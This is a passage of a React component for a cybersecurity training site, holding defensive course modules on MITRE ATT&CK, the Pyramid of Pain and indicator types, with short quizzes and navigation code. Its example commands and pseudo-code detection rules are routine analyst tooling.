                </li>
                <li>
                  <strong>Credential Dumping (T1003):</strong> A technique under Credential Access that involves extracting account credentials from operating systems.
                </li>
                <li>
                  <strong>Process Injection (T1055):</strong> A technique under Defense Evasion that involves injecting malicious code into legitimate processes.
                </li>
                <li>
                  <strong>Lateral Tool Transfer (T1570):</strong> A technique used for Lateral Movement that involves transferring tools between systems to facilitate further compromise.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> During an investigation, analysts may observe unusual network traffic associated with PowerShell commands. Mapping this activity to the "Process Injection" technique helps identify that an attacker is attempting to hide malicious code within legitimate processes.
              </p>
              <p>
                Organizations often use the detailed technique descriptions in the ATT&CK framework to build detection rules for SIEM systems, create threat hunting queries, and prioritize remediation efforts.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK vs. the Cyber Kill Chain",
          summary: (
            <>
              <p>
                <strong>Comparing Two Prominent Models</strong>
              </p>
              <p>
                Both the MITRE ATT&CK framework and the Cyber Kill Chain are models used to understand and counter cyber attacks, but they differ in scope and approach. The Cyber Kill Chain, developed by Lockheed Martin, outlines a linear progression of an attack from reconnaissance to actions on objectives. In contrast, the MITRE ATT&CK framework offers a more granular and comprehensive taxonomy of adversary behaviors.
              </p>
              <p>
                <strong>Key Differences:</strong>
              </p>
              <ul>
                <li>
                  <strong>Linear vs. Comprehensive:</strong> The Cyber Kill Chain presents a linear, step-by-step process, whereas MITRE ATT&CK provides detailed tactics and techniques that cover a wider range of adversary behaviors.
                </li>
                <li>
                  <strong>Granularity:</strong> MITRE ATT&CK dives deeper into specific methods (techniques), while the Cyber Kill Chain focuses on broader phases of an attack.
                </li>
                <li>
                  <strong>Usage:</strong> The Cyber Kill Chain is useful for high-level analysis and incident response, whereas MITRE ATT&CK is widely used for threat modeling, detection engineering, and proactive threat hunting.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A defender may use the Cyber Kill Chain to quickly identify which phase an attack is in and interrupt it. Alternatively, they might use MITRE ATT&CK to fine-tune detection rules and correlate multiple indicators that suggest a specific technique, such as lateral movement via Remote Services (T1021).
              </p>
              <p>
                In summary, while both models are valuable, MITRE ATT&CK provides a more detailed and flexible approach, making it highly effective in modern threat detection and response.
              </p>
            </>
          )
        },
        {
          title: "How Do You Use the MITRE ATT&CK Matrix",
          summary: (
            <>
              <p>
                <strong>Applying the ATT&CK Matrix in Practice</strong>
              </p>
              <p>
                The MITRE ATT&CK Matrix is not only a reference tool but also a practical resource for enhancing an organization’s security posture. By mapping incidents, alerts, and security controls to the matrix, defenders can better understand adversary behaviors, identify gaps in defenses, and prioritize mitigation efforts.
              </p>
              <p>
                <strong>Steps to Utilize the Matrix:</strong>
              </p>
              <ol>
                <li>
                  <strong>Mapping Incidents:</strong> When an incident occurs, analysts map observed behaviors to corresponding tactics and techniques in the matrix. This helps in understanding the adversary’s approach and determining which areas of the network were targeted.
                </li>
                <li>
                  <strong>Detection Engineering:</strong> Use the matrix to develop and refine detection rules. For example, if multiple alerts correlate with a specific technique like “Process Injection” (T1055), analysts can fine-tune their SIEM queries to better detect similar activities.
                </li>
                <li>
                  <strong>Threat Hunting:</strong> Proactively search for indicators of compromise by using the matrix as a checklist of techniques that adversaries might use. This can involve writing queries in SIEM tools or using open-source threat intelligence feeds.
                </li>
                <li>
                  <strong>Gap Analysis and Mitigation:</strong> Assess current security controls against the matrix to identify which techniques are not adequately covered. Then, implement additional measures to mitigate these gaps.
                </li>
              </ol>
              <p>
                <strong>Example Usage:</strong> An organization might conduct a quarterly review of its security posture by mapping recent incidents to the ATT&CK Matrix. They discover that “Credential Access” techniques such as “Brute Force” (T1110) are under-monitored. As a result, they implement stronger password policies and deploy additional monitoring on authentication systems.
              </p>
              <p>
                <strong>Code Snippet Example:</strong> In a SIEM environment, an analyst could create a correlation rule such as:
              </p>
              <pre>{`if (event.technique == "T1055") {
      alert("Potential Process Injection detected");
    }`}</pre>
              <p>
                Ultimately, the ATT&CK Matrix is a dynamic tool that empowers security teams to improve detection, streamline incident response, and foster a culture of proactive threat hunting.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What is the purpose of the MITRE ATT&CK framework?",
            options: [
              "To model adversary behavior",
              "To design firewalls",
              "To develop software",
              "To manage networks"
            ],
            correctAnswer: "To model adversary behavior"
          }
        ]
      }
    },
    {
      id: "module4",
      title: "Defensive Strategies & Countermeasures",
      sections: [
        {
          title: "What is the Pyramid of Pain",
          summary: (
            <>
                          <img
                src="/Learning Paths/SOC/Pyramid.png"
                alt="Pyramid of Pain"
                className="my-4 w-full max-w-md mx-auto"
              />
              <p><strong>Introduction to the Pyramid of Pain</strong></p>
              <p>
                The Pyramid of Pain is a conceptual model that illustrates how different types of indicators, used in threat intelligence and cyber defense, vary in the level of difficulty they impose on adversaries. Developed by David J. Bianco, the pyramid demonstrates that not all indicators are equal—while some (like hash values) are easy for attackers to change, others (like Tactics, Techniques, and Procedures or TTPs) require significant effort to alter.
              </p>
              <p>
                The pyramid is structured in layers, with the simplest and most volatile indicators at the bottom and the hardest-to-change indicators at the top. As you move upward, the “pain” inflicted on an adversary increases when these indicators are disrupted or eliminated.
              </p>
              <p>
                <strong>Layers of the Pyramid:</strong>
              </p>
              <ul>
                <li><strong>Hash values:</strong> Easily changed file hashes.</li>
                <li><strong>IP addresses:</strong> Often transient, can be easily replaced.</li>
                <li><strong>Domain names:</strong> Important but can be re-registered.</li>
                <li><strong>Network Artifacts:</strong> Log data, protocol behaviors, etc.</li>
                <li><strong>Host Artifacts:</strong> System-level details like registry keys, file paths, or specific software versions.</li>
                <li><strong>Tools:</strong> Specific malware or hacking tools used by attackers.</li>
                <li><strong>Tactics, Techniques, and Procedures (TTPs):</strong> The most resilient and difficult-to-change elements that define how an adversary operates.</li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> If an organization focuses solely on indicators like hash values or IP addresses, an attacker can simply modify these attributes. However, if defenders focus on disrupting the adversary's TTPs, the attacker is forced to fundamentally change their operational approach, causing significant “pain” and disruption.
              </p>
              <p>
                The Pyramid of Pain encourages organizations to prioritize defensive measures that target the most strategic aspects of an attack, thereby maximizing the impact on adversaries.
              </p>
            </>
          )
        },
        {
          title: "Hash values",
          summary: (
            <>
              <p><strong>Understanding Hash Values as Indicators</strong></p>
              <p>
                Hash values are unique fingerprints generated by cryptographic hash functions (e.g., MD5, SHA-1, SHA-256) for files or data. They serve as indicators of compromise (IOCs) by identifying specific malicious files. However, hash values are considered the easiest indicator for adversaries to change.
              </p>
              <p>
                <strong>How Hashing Works:</strong> A hash function takes input data and produces a fixed-length string that represents the input. Even a minor change in the file will produce a completely different hash.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Calculating an MD5 hash:
                  <br /><code>md5sum malware.exe</code>
                </li>
                <li>
                  Using SHA-256:
                  <br /><code>sha256sum document.pdf</code>
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> A malware sample may be identified by its SHA-256 hash. Once detected, the hash is added to threat intelligence feeds. However, attackers can easily recompile or modify their malware to generate a new hash, rendering hash-based detection less effective over time.
              </p>
              <p>
                While useful for initial detection, hash values are considered a low-level indicator on the Pyramid of Pain because of their volatility.
              </p>
            </>
          )
        },
        {
          title: "IP addresses",
          summary: (
            <>
              <p><strong>IP Addresses as Indicators</strong></p>
              <p>
                IP addresses are numerical labels assigned to devices on a network. They can be used as indicators of compromise to identify malicious activity, such as command-and-control servers or sources of attacks. However, like hash values, IP addresses are relatively easy for adversaries to change.
              </p>
              <p>
                <strong>How IP Addresses Work:</strong> Devices are assigned IP addresses that can be static or dynamic. In many cases, attackers use dynamic or spoofed IP addresses to evade detection.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Identifying malicious IP addresses with a tool like <code>nmap</code>:
                  <br /><code>nmap -sV 192.168.1.0/24</code>
                </li>
                <li>
                  Analyzing logs to detect repeated access from a suspicious IP:
                  <br /><code>grep "192.0.2.100" /var/log/auth.log</code>
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An intrusion detection system (IDS) might flag an IP address associated with a known threat actor. However, if the attacker shifts to a new IP or uses a proxy network, the indicator becomes less reliable. This dynamic nature makes IP addresses a moderate-level indicator on the Pyramid.
              </p>
              <p>
                In summary, while IP addresses can help in tracking attacks, they require correlation with other indicators to be truly effective.
              </p>
            </>
          )
        },
        {
          title: "Domain names",
          summary: (
            <>
              <p><strong>Domain Names as Indicators</strong></p>
              <p>
                Domain names are human-readable addresses that map to IP addresses. They are used by attackers to host malicious content, set up phishing sites, or run command-and-control servers. Like IP addresses, domain names can be easily changed, but they still provide valuable context in threat intelligence.
              </p>
              <p>
                <strong>How Domain Names Work:</strong> Domain names are registered with registrars and managed via DNS. Attackers may use domain generation algorithms (DGAs) to create new domains dynamically.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Checking domain details using <code>whois</code>:
                  <br /><code>whois maliciousdomain.com</code>
                </li>
                <li>
                  Resolving domain names with <code>nslookup</code>:
                  <br /><code>nslookup maliciousdomain.com</code>
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> A phishing campaign may use a domain that resembles a legitimate site, such as <code>amaz0n.com</code> instead of <code>amazon.com</code>. Once detected, security teams can block the domain and update threat intelligence feeds. Despite the ease of domain switching, the information provided by a domain name, such as its registration history and associated IP addresses, is invaluable.
              </p>
              <p>
                Domain names, when used in conjunction with other indicators, can enhance an organization's threat-hunting capabilities.
              </p>
            </>
          )
        },
        {
          title: "Network Artifacts",
          summary: (
            <>
              <p><strong>Understanding Network Artifacts</strong></p>
              <p>
                Network artifacts are pieces of evidence found in network traffic and logs that indicate suspicious or malicious activity. These include packet captures, flow data, protocol anomalies, and log entries from devices such as routers, switches, and firewalls.
              </p>
              <p>
                <strong>Examples of Network Artifacts:</strong>
              </p>
              <ul>
                <li>
                  <strong>Packet Captures:</strong> Using tools like Wireshark to capture and analyze network traffic can reveal malicious payloads or abnormal communication patterns.
                </li>
                <li>
                  <strong>Flow Data:</strong> NetFlow data can be used to monitor bandwidth usage and detect unusual data transfers.
                </li>
                <li>
                  <strong>Log Files:</strong> Firewall and IDS logs often contain artifacts such as repeated connection attempts or unusual protocols that can indicate an attack.
                </li>
              </ul>
              <p>
                <strong>Example Command:</strong> Capture network traffic on an interface:
              </p>
              <pre>{`sudo tcpdump -i eth0 -w capture.pcap`}</pre>
              <p>
                Analyzing these artifacts helps defenders identify patterns and anomalies that correlate with malicious behavior. While network artifacts can be more challenging for attackers to modify, they often require sophisticated analysis to extract meaningful insights.
              </p>
              <p>
                Effective monitoring of network artifacts is a key component of threat detection and incident response.
              </p>
            </>
          )
        },
        {
          title: "Host Artifacts",
          summary: (
            <>
              <p><strong>Understanding Host Artifacts</strong></p>
              <p>
                Host artifacts are indicators that reside on individual computers or servers. They include file paths, registry keys, system logs, and configuration files that can reveal evidence of compromise or malicious activity on a specific host.
              </p>
              <p>
                <strong>Examples of Host Artifacts:</strong>
              </p>
              <ul>
                <li>
                  <strong>File System Changes:</strong> Newly created or modified files in sensitive directories. For instance, unexpected executables in the Windows <code>C:\Windows\Temp</code> folder.
                </li>
                <li>
                  <strong>Registry Modifications:</strong> Changes to critical registry keys that control system behavior.
                </li>
                <li>
                  <strong>System Logs:</strong> Windows Event Logs or Linux syslogs that may indicate unauthorized access, failed logins, or unusual process behavior.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An analyst might notice an unfamiliar process running on a workstation and then check the system logs or file system artifacts. Using PowerShell:
              </p>
              <pre>{`Get-EventLog -LogName Security -Newest 50 | Where-Object { $_.EventID -eq 4625 }`}</pre>
              <p>
                Such artifacts help pinpoint the origin of an attack and are more difficult for adversaries to change without overhauling their entire methodology.
              </p>
            </>
          )
        },
        {
          title: "Tools",
          summary: (
            <>
              <p><strong>Security Tools and Their Role</strong></p>
              <p>
                Tools are critical components of a cyber defender’s arsenal. In the context of the Pyramid of Pain, tools represent the software and systems that collect, analyze, and correlate various indicators of compromise. While tools themselves can sometimes be replaced or updated by attackers, they provide invaluable insights into adversary behavior.
              </p>
              <p>
                <strong>Examples of Security Tools:</strong>
              </p>
              <ul>
                <li>
                  <strong>SIEM Systems:</strong> Tools like Splunk, ELK, and QRadar aggregate logs from across an organization, helping to correlate events and detect anomalies.
                </li>
                <li>
                  <strong>Threat Intelligence Platforms:</strong> Platforms such as Recorded Future or MISP consolidate threat data, including indicators like IPs, domains, and TTPs.
                </li>
                <li>
                  <strong>Network Analyzers:</strong> Tools like Wireshark and tcpdump capture and analyze network traffic for forensic analysis.
                </li>
                <li>
                  <strong>Endpoint Detection and Response (EDR):</strong> Solutions like CrowdStrike Falcon or SentinelOne monitor host activities and provide detailed forensic data.
                </li>
              </ul>
              <p>
                <strong>Practical Example:</strong> An organization may use a SIEM to aggregate logs from various sources and then apply correlation rules based on MITRE ATT&CK or the Pyramid of Pain to flag suspicious activities. For instance:
              </p>
              <pre>{`# Pseudo-code for a SIEM rule
    if (log.event == "file_created" && file.hash in known_malicious_hashes) {
      alert("Malicious file detected");
    }`}</pre>
              <p>
                These tools provide the backbone for effective threat detection, enabling defenders to rapidly identify and respond to attacks.
              </p>
            </>
          )
        },
        {
          title: "Tactics, Techniques and Procedures (TTPs)",
          summary: (
            <>
              <p><strong>Understanding TTPs in the Context of the Pyramid</strong></p>
              <p>
                Tactics, Techniques, and Procedures (TTPs) represent the behavioral patterns and methods used by adversaries during an attack. Unlike technical indicators like hash values or IP addresses, TTPs are difficult for attackers to change and therefore cause the greatest "pain" when disrupted.
              </p>
              <p>
                <strong>Components of TTPs:</strong>
              </p>
              <ul>
                <li>
                  <strong>Tactics:</strong> The high-level objectives of an attack (e.g., initial access, lateral movement, exfiltration).
                </li>
                <li>
                  <strong>Techniques:</strong> The specific methods employed to achieve each tactic. For example, “Process Injection” or “Credential Dumping.”
                </li>
                <li>
                  <strong>Procedures:</strong> Detailed, repeatable actions that adversaries perform during an attack. These may include the use of specific tools or commands.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An attacker might use spear phishing (a technique) to achieve initial access (a tactic) and then perform credential dumping (another technique) to move laterally within a network. This sequence of actions forms the attacker’s TTPs.
              </p>
              <p>
                <strong>Importance in Cyber Defense:</strong> Because TTPs reflect the adversary’s behavior and mindset, detecting and mitigating them can force attackers to change their methods entirely—an outcome that is particularly disruptive.
              </p>
              <p>
                <strong>Example in Practice:</strong> Defenders may analyze incident data and map it to known TTPs using frameworks like MITRE ATT&CK. This mapping can then inform proactive threat hunting and tailored security measures.
              </p>
              <p>
                By focusing on TTPs, organizations can develop more resilient defenses that are harder for attackers to circumvent, thus maximizing the impact on the adversary’s operations.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What does the Pyramid of Pain illustrate?",
            options: [
              "The difficulty in eliminating certain threat indicators",
              "A network topology",
              "A layered firewall design",
              "An encryption algorithm"
            ],
            correctAnswer: "The difficulty in eliminating certain threat indicators"
          }
        ]
      }
    },
    
  ];

  // State: which module, which section within that module, and whether we're in quiz mode.
  const [currentModuleIndex, setCurrentModuleIndex] = useState(0);
  const [currentSectionIndex, setCurrentSectionIndex] = useState(0);
  const [inQuiz, setInQuiz] = useState(false);
  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizScore, setQuizScore] = useState(null);

  // State to track completed modules (quiz finished)
  const [completedModules, setCompletedModules] = useState(Array(course.length).fill(false));

  // Left sidebar dropdown state for each module (open/closed)
  const [openModules, setOpenModules] = useState(Array(course.length).fill(false));

  // Toggle dropdown for a module.
  const toggleModule = (index) => {
    setOpenModules((prev) =>
      prev.map((open, idx) => (idx === index ? !open : open))
    );
  };

  const currentModule = course[currentModuleIndex];
  const totalSections = currentModule.sections.length;

  // Reset quiz state when module, section, or quiz view changes.
  useEffect(() => {
    setQuizAnswers({});
    setQuizScore(null);
  }, [currentModuleIndex, currentSectionIndex, inQuiz]);

  // Optional: Intersection Observer for animations.
  useEffect(() => {
    const observerCallback = (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('active');
        }
      });
    };
    const observerOptions = { threshold: 0.1, rootMargin: '0px 0px -50px 0px' };
    const observer = new IntersectionObserver(observerCallback, observerOptions);
    const revealElements = document.querySelectorAll(
      '.reveal, .reveal-left, .reveal-right, .reveal-scale'
    );
    revealElements.forEach((element) => observer.observe(element));
    return () => observer.disconnect();
  }, [currentModuleIndex, currentSectionIndex, inQuiz]);

  // Handle quiz answer changes.
  const handleQuizChange = (questionId, answer) => {
    setQuizAnswers((prev) => ({ ...prev, [questionId]: answer }));
  };

  const handleQuizSubmit = (e) => {
    e.preventDefault();
    let score = 0;
    currentModule.quiz.questions.forEach((q) => {
      if (quizAnswers[q.id] === q.correctAnswer) {
        score++;
      }
    });
    setQuizScore(score);
    // Mark the current module as completed after quiz submission.
    setCompletedModules((prev) => {
      const newArr = [...prev];
      newArr[currentModuleIndex] = true;
      return newArr;
    });
  };

  // Next Page Navigation:
  // - If not in quiz mode, go through sections then switch to quiz.
  // - In quiz mode, allow user to continue without forcing quiz submission.
  // Additionally, when moving to a new module, update the openModules so the previous module closes and the new module opens.
  const handleNextPage = () => {
    if (!inQuiz) {
      if (currentSectionIndex < totalSections - 1) {
        setCurrentSectionIndex(currentSectionIndex + 1);
      } else {
        setInQuiz(true);
      }
    } else {
      if (currentModuleIndex < course.length - 1) {
        const newModuleIndex = currentModuleIndex + 1;
        setCurrentModuleIndex(newModuleIndex);
        setCurrentSectionIndex(0);
        setInQuiz(false);
        // Update the dropdown state: close all modules, then open the new one.
        setOpenModules(Array(course.length).fill(false).map((_, idx) => idx === newModuleIndex));
      } else {
        alert("Congratulations! You have completed the course.");
      }
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white dark:bg-background text-gray-900 dark:text-white">
      {/* Full Navigation Bar */}
      <div className="bg-gray-100 dark:bg-primary-dark">
        <Navigation />
      </div>

      {/* Main Content Area */}
      <div className="flex flex-1">
        {/* Left Sidebar */}
        <aside className="w-64 bg-gray-100 dark:bg-primary-dark/30 border-r border-primary-blue/20 glass-effect p-4">
          {/* Back to Learning Paths Link */}
          <div className="mb-6">
            <Link
              to="/learning-paths"
              className="flex items-center text-primary-blue hover:text-primary-blue/80"
            >
              <ArrowLeft className="w-5 h-5 mr-2" />
              Back to Learning Paths
            </Link>
          </div>
          <h2 className="text-lg font-semibold mb-4 gradient-text">Course Modules</h2>
          {course.map((module, mIndex) => (
            <div key={module.id} className="mb-4">
              <button
                onClick={() => toggleModule(mIndex)}
                className="w-full flex justify-between items-center px-4 py-2 rounded-md hover:bg-primary-blue/10 transition"
              >
                <span className={`${mIndex === currentModuleIndex ? 'text-primary-blue font-bold' : ''}`}>
                  {module.title}
                </span>
                {completedModules[mIndex] && (
                  <Check className="w-4 h-4 text-green-500 inline ml-2" />
                )}
                {openModules[mIndex] ? <ChevronDown /> : <ChevronRight />}
              </button>
              {openModules[mIndex] && (
                <ul className="mt-2 ml-4 space-y-1">
                  {module.sections.map((sec, sIndex) => (
                    <li key={sIndex}>
                      <button
                        onClick={() => {
                          setCurrentModuleIndex(mIndex);
                          setCurrentSectionIndex(sIndex);
                          setInQuiz(false);
                        }}
                        className="w-full text-left px-4 py-1 rounded-md hover:bg-primary-blue/10 transition"
                      >
                        {sec.title}
                      </button>
                    </li>
                  ))}
                  <li>
                    <button
                      onClick={() => {
                        setCurrentModuleIndex(mIndex);
                        setInQuiz(true);
                      }}
                      className="w-full text-left px-4 py-1 rounded-md hover:bg-primary-blue/10 transition"
                    >
                      Quiz
                    </button>
                  </li>
                </ul>
              )}
            </div>
          ))}
        </aside>

        {/* Main Course Content */}
        <main className="flex-1 p-8 bg-white dark:bg-background">
          <header className="mb-8">
            <div className="flex items-center space-x-4">
              <Book className="w-8 h-8 text-primary-blue animate-pulse-slow" />
              <div>
                <h1 className="text-2xl font-bold gradient-text">OSWP Road Map</h1>
                <p className="text-gray-400 text-sm">
                </p>
              </div>
            </div>
          </header>

          <div className="space-y-8">
            <h2 className="text-3xl font-bold mb-4 reveal-scale">
              {currentModule.title}
            </h2>

            {/* Display Section Content or Quiz */}
            {!inQuiz ? (
              <div className="reveal">
                <h3 className="text-2xl font-bold mb-4">
                  {currentModule.sections[currentSectionIndex].title}
                </h3>
                <div className="text-lg whitespace-pre-line">
                  {currentModule.sections[currentSectionIndex].summary}
                </div>
              </div>
            ) : (
              <div className="bg-gray-100 dark:bg-primary-dark/40 p-6 rounded shadow-lg reveal-scale">
                <h3 className="text-2xl font-bold mb-4">Quiz: {currentModule.title}</h3>
                {quizScore === null ? (
                  <>
                    <form onSubmit={handleQuizSubmit}>
                      {currentModule.quiz.questions.map((q, index) => (
                        <div key={q.id} className="mb-6">
                          <p className="mb-2">
                            {index + 1}. {q.question}
                          </p>
                          <div className="space-y-2">
                            {q.options.map((option, idx) => (
                              <label key={idx} className="block">
                                <input
                                  type="radio"
                                  name={`question-${q.id}`}
                                  value={option}
                                  checked={quizAnswers[q.id] === option}
                                  onChange={() => handleQuizChange(q.id, option)}
                                  className="mr-2"
                                />
                                {option}
                              </label>
                            ))}
                          </div>
                        </div>
                      ))}
                      <button type="submit" className="px-4 py-2 bg-primary-blue text-white rounded hover:bg-primary-blue/80 transition">
                        Submit Quiz
                      </button>
                    </form>
                    <p className="mt-4 italic text-sm">
                      You may also skip this quiz and continue by clicking Next Page.
                    </p>
                  </>
                ) : (
                  <div className="p-4 bg-primary-blue/20 rounded">
                    <h4 className="text-xl font-bold">
                      Your Score: {quizScore} / {currentModule.quiz.questions.length}
                    </h4>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Next Page Navigation */}
          <div className="mt-12 flex justify-end">
            <button
              onClick={handleNextPage}
              className="px-4 py-2 bg-primary-blue text-white rounded hover:bg-primary-blue/80 transition"
            >
              Next Page
            </button>
          </div>
        </main>
      </div>

      {/* Footer */}
      <footer className="bg-gray-100 dark:bg-primary-dark/30 text-gray-900 dark:text-white py-8 border-t border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <p className="text-gray-400">© 2025 HackTheHackers. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default OSWPCourse;
